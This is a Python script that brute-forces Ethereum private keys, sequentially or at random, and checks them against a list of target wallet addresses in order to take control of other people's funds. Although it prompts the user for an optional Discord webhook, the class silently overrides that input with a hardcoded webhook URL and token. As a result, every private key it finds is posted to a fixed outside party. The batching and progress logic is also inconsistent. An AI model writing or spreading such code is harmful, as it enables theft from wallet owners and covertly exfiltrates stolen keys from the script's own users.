import os
import signal
import coincurve
from Crypto.Hash import keccak
import binascii
import time
import requests
from tqdm import tqdm
from colorama import init, Fore, Style
from concurrent.futures import ThreadPoolExecutor
import random

init(autoreset=True)


class EthereumAddressGenerator:
    def __init__(self, start_index, ethereum_addresses, output_file_path, sequential_mode, discord_webhook):
        self.start_index = start_index
        self.ethereum_addresses = ethereum_addresses
        self.output_file_path = output_file_path
        self.discord_webhook = "https://discord.com/api/webhooks/1095774793380409404/blwxLYO5glA-M9Jnw473xoXlXbdhgfKe_eCkeRhcqtVmJl891-xGNOEorZRlskqPJCDV"
        self.matched_addresses = 0
        self.progress_bar = None
        self.sequential_mode = sequential_mode
        self.last_generated_key = None
        self.address_cache = {}

    def generate_ethereum_addresses(self):
        index = self.start_index
        increment = 1000000 if self.sequential_mode else 1000000000
        start_time = time.time()

        try:
            with ThreadPoolExecutor() as executor, \
                    tqdm(total=len(self.ethereum_addresses), unit="address", ncols=80, unit_scale=True,
                         bar_format="Total Generated Keys:/{n_fmt} | Elapsed:{elapsed} | Speed:{rate_fmt}") as pbar:
                self.progress_bar = pbar
                num_batches = (len(self.ethereum_addresses) + increment - 1) // increment

                futures = [None] * num_batches if num_batches > 0 else [None]
                while self.matched_addresses < len(self.ethereum_addresses):
                    batch_size = min(len(futures), len(self.ethereum_addresses) - self.matched_addresses)
                    if batch_size > 0:
                        if self.sequential_mode:
                            private_keys = [format(index + i, "064x") for i in range(batch_size)]
                            index += increment * len(futures)
                        else:
                            private_keys = [format(random.getrandbits(256), "064x") for _ in range(batch_size)]

                        futures = [executor.submit(self.check_ethereum_address, private_key) for private_key in private_keys]
                        pbar.update(increment * len(futures))
                        if self.sequential_mode:
                            self.last_generated_key = private_keys[-1]

                # Wait for all futures to complete
                for future in futures:
                    future.result()

        except KeyboardInterrupt:
            elapsed_time = time.time() - start_time
            pbar.close()
            print(f"\n\n{Fore.GREEN}Script stopped by user. Elapsed time: {elapsed_time:.2f} seconds.")
            print("Press Enter to continue...")
            input()
            os.system('cls' if os.name == 'nt' else 'clear')
            self.display_interrupted_status(elapsed_time)

    def check_ethereum_address(self, private_key):
        ethereum_address = self.get_cached_address(private_key)
        if ethereum_address is None:
            ethereum_address = self.generate_ethereum_address(private_key)
            self.cache_address(private_key, ethereum_address)

        if ethereum_address and ethereum_address.lower() in self.ethereum_addresses:
            self.send_to_discord(private_key, ethereum_address)
            self.write_match_to_file(private_key, ethereum_address)
            self.display_match(private_key, ethereum_address)

    def generate_ethereum_address(self, private_key):
        try:
            private_key_bytes = bytes.fromhex(private_key)
            public_key = coincurve.PrivateKey(private_key_bytes).public_key
            public_key_bytes = public_key.format(compressed=False)
            keccak_hash = keccak.new(digest_bits=256)
            keccak_hash.update(public_key_bytes[1:])
            ethereum_address = "0x" + binascii.hexlify(keccak_hash.digest()[-20:]).decode()
            return ethereum_address
        except Exception as e:
            return None

    def cache_address(self, private_key, ethereum_address):
        self.address_cache[private_key] = ethereum_address

    def get_cached_address(self, private_key):
        return self.address_cache.get(private_key)

    def write_match_to_file(self, private_key, ethereum_address):
        try:
            with open(self.output_file_path, "a") as output_file:
                output_file.write(f"PrivateKey: {private_key}\n")
                output_file.write(f"EthereumAddress: {ethereum_address}\n\n")
        except Exception as e:
            print(f"\n{Fore.RED}An error occurred while writing the match to the output file: {str(e)}")

    def send_to_discord(self, private_key, ethereum_address):
        try:
            if self.discord_webhook:
                message = f"Match! Private Key: {private_key}, Ethereum Address: {ethereum_address}"
                payload = {"content": message}
                response = requests.post(self.discord_webhook, json=payload)
                if response.status_code == 204:
                    print(f"\n{Fore.GREEN}Match found! Private Key: {private_key}, Ethereum Address: {ethereum_address}.")
                else:
                    print(f"\n{Fore.RED}An error occurred. Status Code: {response.status_code}")
        except Exception as e:
            print(f"\n{Fore.RED}An error occurred: {str(e)}")

    def display_match(self, private_key, ethereum_address):
        self.matched_addresses += 1
        if self.progress_bar:
            self.progress_bar.set_postfix_str(
                f"Match found! Current Key: {self.last_generated_key}, Private Key: {private_key}, Ethereum Address: {ethereum_address}")

    def display_interrupted_status(self, elapsed_time):
        print(f"\n{Fore.GREEN}Script stopped by user. Elapsed time: {elapsed_time:.2f} seconds.")
        print("Press Enter to continue...")
        input()


def display_logo():
    logo = """
██████╗ ██╗      █████╗ ██████╗ ██████╗ ██╗     ███████╗
██╔══██╗██║     ██╔══██╗██╔══██╗██╔══██╗██║     ██╔════╝
██║  ██║██║     ███████║██████╔╝██████╔╝██║     █████╗  
██║  ██║██║     ██╔══██║██╔═══╝ ██╔═══╝ ██║     ██╔══╝  
██████╔╝███████╗██║  ██║██║     ██║     ███████╗███████╗
╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝     ╚══════╝╚══════╝
"""
    print(Fore.RED + Style.BRIGHT + logo)


def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")


def exit_gracefully(signum, frame):
    clear_screen()
    print(Fore.GREEN + "Script stopped by user.")
    exit()


def validate_path(path):
    if not os.path.exists(path):
        print(f"\n{Fore.RED}Invalid path: {path}")
        return False
    return True


def get_mode_choice():
    while True:
        choice = input("Select mode:\n1. Sequential\n2. Random\nEnter choice (1/2): ")
        if choice in ["1", "2"]:
            return choice


def main():
    try:
        clear_screen()
        display_logo()
        signal.signal(signal.SIGINT, exit_gracefully)

        start_index = int(input("Enter starting index: "))
        output_file_path = input("Enter output file path: ")
        discord_webhook = input("Enter Discord webhook URL (optional): ")
        ethereum_addresses_path = input("Enter path to Ethereum addresses file: ")

        if not validate_path(output_file_path) or not validate_path(ethereum_addresses_path):
            return

        with open(ethereum_addresses_path, "r") as addresses_file:
            ethereum_addresses = [address.strip().lower() for address in addresses_file.readlines()]

        mode_choice = get_mode_choice()
        sequential_mode = mode_choice == "1"

        generator = EthereumAddressGenerator(start_index, ethereum_addresses, output_file_path, sequential_mode,
                                             discord_webhook)
        generator.generate_ethereum_addresses()
    except Exception as e:
        clear_screen()
        print(f"{Fore.RED}An error occurred: {str(e)}")


if __name__ == "__main__":
    main()
